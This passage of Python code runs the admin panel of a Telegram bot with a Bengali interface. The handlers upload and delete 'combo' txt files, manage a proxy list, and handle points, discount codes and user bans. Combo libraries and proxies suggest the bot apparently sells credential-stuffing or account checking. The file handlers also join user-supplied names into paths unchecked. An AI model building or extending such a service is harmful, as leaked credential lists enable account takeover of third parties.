            bot.edit_message_text("🔄 রিফ্রেশ সম্পন্ন", call.message.chat.id, call.message.message_id)
        except ApiTelegramException:
            pass
    elif call.data == 'add_combo':
        msg = bot.send_message(DEVELOPER_ID, "📤 লাইব্রেরিতে যোগ করার জন্য কম্বো ফাইল (txt) পাঠান:")
        bot.register_next_step_handler(msg, add_combo_step)
    elif call.data == 'delete_combo_menu':
        combos = get_combo_list()
        if not combos:
            bot.send_message(DEVELOPER_ID, get_text('no_combos', DEVELOPER_ID))
            return
        bot.edit_message_text(get_text('delete_combo', DEVELOPER_ID), call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=create_delete_combo_buttons(DEVELOPER_ID))
    elif call.data == 'add_discount_code':
        msg = bot.send_message(DEVELOPER_ID, "ডিসকাউন্ট কোড এবং শতাংশ পাঠান (উদাহরণ: SAVE50 50):")
        bot.register_next_step_handler(msg, add_discount_code_step)
    elif call.data == 'proxy_manager':
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        markup.add(telebot.types.InlineKeyboardButton("➕ প্রক্সি যোগ করুন", callback_data="add_proxy"))
        markup.add(telebot.types.InlineKeyboardButton("🗑 প্রক্সি মুছুন", callback_data="del_proxy"))
        markup.add(telebot.types.InlineKeyboardButton("📋 প্রক্সি তালিকা", callback_data="list_proxies"))
        bot.edit_message_text("🌐 প্রক্সি ব্যবস্থাপনা", call.message.chat.id, call.message.message_id, reply_markup=markup)
    elif call.data == 'add_bot_points':
        msg = bot.send_message(DEVELOPER_ID, "💰 বটের ব্যালেন্সে কত পয়েন্ট যোগ করতে চান তা লিখুন:")
        bot.register_next_step_handler(msg, add_bot_points_step)

def add_bot_points_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    try:
        points = int(message.text.strip())
        global bot_points
        bot_points += points
        save_data()
        bot.reply_to(message, f"✅ বটের ব্যালেন্সে {points} পয়েন্ট যোগ করা হয়েছে। বর্তমান ব্যালেন্স: {bot_points}")
    except:
        bot.reply_to(message, "❌ ত্রুটি: একটি সঠিক সংখ্যা লিখুন")

@bot.callback_query_handler(func=lambda call: call.data in ['add_proxy', 'del_proxy', 'list_proxies'])
def proxy_actions(call):
    if call.from_user.id != DEVELOPER_ID:
        bot.answer_callback_query(call.id, "❌ শুধুমাত্র ডেভেলপারের জন্য")
        return
    if call.data == 'add_proxy':
        msg = bot.send_message(DEVELOPER_ID, "ip:port অথবা ip:port:user:pass ফরম্যাটে প্রক্সি পাঠান:")
        bot.register_next_step_handler(msg, add_proxy_step)
    elif call.data == 'del_proxy':
        if not proxies_list:
            bot.send_message(DEVELOPER_ID, "মুছার মতো কোনো প্রক্সি নেই")
            return
        markup = telebot.types.InlineKeyboardMarkup(row_width=1)
        for idx, proxy in enumerate(proxies_list):
            markup.add(telebot.types.InlineKeyboardButton(f"🗑 {proxy}", callback_data=f"del_proxy_{idx}"))
        bot.edit_message_text("মুছার জন্য একটি প্রক্সি নির্বাচন করুন:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    elif call.data == 'list_proxies':
        if not proxies_list:
            text = "📋 কোনো প্রক্সি নেই"
        else:
            text = "📋 প্রক্সি তালিকা:\n" + "\n".join(f"{i+1}. {p}" for i, p in enumerate(proxies_list))
        bot.send_message(DEVELOPER_ID, text)

def add_proxy_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    proxy = message.text.strip()
    proxies_list.append(proxy)
    save_data()
    bot.reply_to(message, f"✅ প্রক্সি যোগ করা হয়েছে: {proxy}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('del_proxy_'))
def delete_proxy_callback(call):
    if call.from_user.id != DEVELOPER_ID:
        bot.answer_callback_query(call.id, "❌ শুধুমাত্র ডেভেলপারের জন্য")
        return
    idx = int(call.data.split('_')[2])
    if 0 <= idx < len(proxies_list):
        removed = proxies_list.pop(idx)
        save_data()
        bot.answer_callback_query(call.id, f"✅ {removed} মুছে ফেলা হয়েছে")
        admin_panel(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ পাওয়া যায়নি")

def add_discount_code_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    try:
        code, percent = message.text.split()
        percent = int(percent)
        discount_codes[code] = percent
        save_data()
        bot.reply_to(message, f"✅ {code} কোড {percent}% ছাড়ে যোগ করা হয়েছে")
    except:
        bot.reply_to(message, "❌ ত্রুটি: কোড এবং শতাংশ স্পেস দিয়ে আলাদা করে পাঠান")

def add_combo_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    if not message.document:
        bot.reply_to(message, "❌ দয়া করে একটি বৈধ txt ফাইল পাঠান")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        file_path = file_info.file_path
        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        response = requests.get(download_url)
        response.raise_for_status()
        file_name = message.document.file_name
        if not file_name.endswith('.txt'):
            file_name += '.txt'
        save_path = os.path.join(COMBOS_DIR, file_name)
        with open(save_path, 'wb') as f:
            f.write(response.content)
        bot.reply_to(message, get_text('combo_added', DEVELOPER_ID).format(name=file_name))
    except Exception as e:
        bot.reply_to(message, f"❌ ত্রুটি: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_combo_'))
def delete_combo_callback(call):
    if call.from_user.id != DEVELOPER_ID:
        bot.answer_callback_query(call.id, "❌ শুধুমাত্র ডেভেলপারের জন্য")
        return
    combo_name = call.data.replace('delete_combo_', '')
    file_path = os.path.join(COMBOS_DIR, combo_name)
    if os.path.exists(file_path):
        os.remove(file_path)
        bot.answer_callback_query(call.id, get_text('combo_deleted', DEVELOPER_ID).format(name=combo_name), show_alert=True)
        admin_panel(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ ফাইল পাওয়া যায়নি", show_alert=True)

def ban_user_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    try:
        uid = int(message.text.strip())
        blocked_users.add(uid)
        save_data()
        bot.reply_to(message, f"✅ ব্যবহারকারী {uid} ব্লক করা হয়েছে")
    except:
        bot.reply_to(message, "❌ অবৈধ আইডি")

def unban_user_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    try:
        uid = int(message.text.strip())
        blocked_users.discard(uid)
        save_data()
        bot.reply_to(message, f"✅ ব্যবহারকারী {uid} আনব্লক করা হয়েছে")
    except:
        bot.reply_to(message, "❌ অবৈধ আইডি")

load_data()
print('বট চলছে...')
bot.enable_save_next_step_handlers(delay=2)
bot.load_next_step_handlers()
while True:
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
    except ApiTelegramException as e:
        print(f"Telegram API ত্রুটি: {e}")
        time.sleep(5)
    except requests.exceptions.ConnectionError as e:
        print(f"সংযোগ ত্রুটি: {e}")
        time.sleep(10)
    except Exception as e:
        print(f"অপ্রত্যাশিত ত্রুটি: {e}")
        time.sleep(5)
